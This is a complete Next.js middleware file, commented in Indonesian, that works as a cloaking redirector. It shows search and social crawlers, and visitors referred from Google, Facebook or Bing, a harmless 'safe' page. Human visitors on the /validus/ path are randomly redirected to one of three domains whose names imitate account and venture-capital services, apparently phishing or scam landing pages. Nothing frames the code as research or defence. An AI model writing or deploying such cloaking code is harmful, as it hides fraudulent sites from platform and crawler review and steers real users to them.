import { NextResponse } from 'next/server';

// ===============================================
// 1. KONFIGURASI KHUSUS ANDA
// ===============================================

// JALUR URL yang MENGAKTIFKAN PENGALIHAN (harus dimulai dan diakhiri dengan /)
const ACTIVE_REDIRECT_PATH = '/validus/'; 

// URL TARGET ANDA (Pengalihan Acak)
const TARGET_URLS = [
    "https://ventureidven.com/",
    "https://membershipaccountid.com/",
    "https://vcapitalid.com/"
];

// USER AGENT BOT/CRAWLER
const BOT_AGENTS = ["googlebot", "bingbot", "yahoo! slurp", "adsbot", "facebookexternalhit"];

// SUMBER MENCURIGAKAN (Referer)
const SUSPICIOUS_REFERERS = ["google.com", "facebook.com", "bing.com"];


export default function middleware(request) {
    const url = new URL(request.url);
    const userAgent = request.headers.get('user-agent')?.toLowerCase() || '';
    const referer = request.headers.get('referer')?.toLowerCase() || '';

    let isBot = false;

    // A. Pengecekan User Agent
    for (const bot of BOT_AGENTS) {
        if (userAgent.includes(bot)) {
            isBot = true;
            break;
        }
    }

    // B. Pengecekan Referer (Jika ada referer mencurigakan, anggap sebagai Bot)
    for (const ref of SUSPICIOUS_REFERERS) {
        if (referer.includes(ref)) {
            isBot = true;
            break;
        }
    }

    // C. Pengecekan Path (Jalur URL)
    const isCorrectPath = url.pathname.startsWith(ACTIVE_REDIRECT_PATH);


    // ===============================================
    // 3. EKSEKUSI
    // ===============================================

    // KONDISI 1: JALUR BENAR DAN BUKAN BOT (HUMAN)
    if (isCorrectPath && !isBot) {
        // Lakukan Pengalihan Acak 302
        const randomIndex = Math.floor(Math.random() * TARGET_URLS.length);
        const redirectUrl = TARGET_URLS[randomIndex];

        // Header response untuk Redirect 302
        return NextResponse.redirect(redirectUrl, 302);
    } 

    // KONDISI 2: JALUR SALAH ATAU TERDETEKSI BOT
    // Tampilkan Konten Aman (melalui Rewrite ke index.html)

    // Pastikan konten aman Anda ada di public/index.html
    return NextResponse.rewrite(new URL('/index.html', url)); 
}

// Konfigurasi agar Middleware berjalan di SEMUA PATH
export const config = {
    matcher: ['/:path*'],
};
